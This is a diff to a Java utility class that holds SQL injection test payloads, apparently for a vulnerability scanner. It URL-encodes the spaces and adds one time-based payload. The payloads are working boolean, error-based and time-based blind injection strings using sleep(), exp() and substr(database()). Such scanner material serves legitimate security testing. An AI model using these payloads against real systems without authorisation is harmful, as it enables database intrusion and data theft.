@@ -22,21 +22,22 @@ public class PayloadUtils {
         "\"\n" +
         ",1\n" +
         ",0\n" +
-        "' Or 1=1 AND '1'='1\n" +
-        "' Or 1=2 AND '1'='1\n" +
+        "'+Or+1=1+AND+'1'='1\n" +
+        "'+Or+1=2+AND+'1'='1\n" +
         "'||1/1||'\n" +
         "'||1/0||'\n" +
-        "'%df' and sleep(3)#\n" +
-        "'and '1'='1\n" +
-        "+AND 1=1\n" +
-        "+AND sleep(5)\n" +
-        "+AND (SELECT 8778 FROM (SELECT(SLEEP(5)))nXpZ)'\n" +
+        "'%df'+and+sleep(3)#\n" +
+        "'and+'1'='1\n" +
+        "+AND+1=1\n" +
+        "+AND+sleep(5)\n" +
+        "+AND+(SELECT+8778+FROM+(SELECT(SLEEP(5)))nXpZ)'\n" +
         "'||1=if(substr(database(),1,1)='1',exp(999),1)||'\n" +
-        "'and(select*from(select sleep(5))a/**/union/**/select 1)='\n" +
-        "')and(select*from(select sleep(5))a/**/union/**/select 1)--\n" +
-        "1');SELECT SLEEP(5)#\n" +
-        "(SELECT 6242 FROM (SELECT(SLEEP(5)))MgdE)\n" +
-        "(select*from(select if(substr(database(),1,1)='j',exp(709),exp(710)))a)";
+        "'and(select*from(select+sleep(5))a/**/union/**/select+1)='\n" +
+        "')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n" +
+        "1');SELECT+SLEEP(5)#\n" +
+        "';SELECT+SLEEP(5)#\n" +
+        "(SELECT+6242+FROM+(SELECT(SLEEP(5)))MgdE)\n" +
+        "(select*from(select+if(substr(database(),1,1)='j',exp(709),exp(710)))a)";
     
     // orderBy测试组 payload
     private final String ORDER_TEST_PAYLOADS = 
